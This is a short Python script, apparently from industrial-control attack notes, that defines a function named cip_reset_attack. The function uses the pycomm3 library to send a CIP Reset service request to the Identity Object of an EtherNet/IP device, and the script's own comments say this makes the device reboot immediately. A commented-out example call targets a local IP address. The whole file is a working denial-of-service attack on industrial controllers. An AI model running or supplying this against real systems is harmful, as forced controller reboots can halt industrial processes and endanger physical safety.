def cip_reset_attack(target_ip):
    """
    Send CIP Reset service to device
    Causes immediate reboot
    """
    from pycomm3 import CIPDriver

    with CIPDriver(target_ip) as device:
        # CIP Reset service (0x05) to Identity Object (Class 0x01)
        # Service code: 0x05
        # Class: 0x01 (Identity)
        # Instance: 0x01

        # Build generic CIP request
        reset_request = device.generic_message(
            service=0x05,  # Reset
            class_code=0x01,  # Identity Object
            instance=0x01,
            request_data=b'\x00'  # Type 0 = Reset
        )

        if reset_request:
            print("[+] Reset command sent - device rebooting")
        else:
            print("[-] Reset failed")

# WARNING: Causes immediate device reboot
# cip_reset_attack('192.168.1.100')
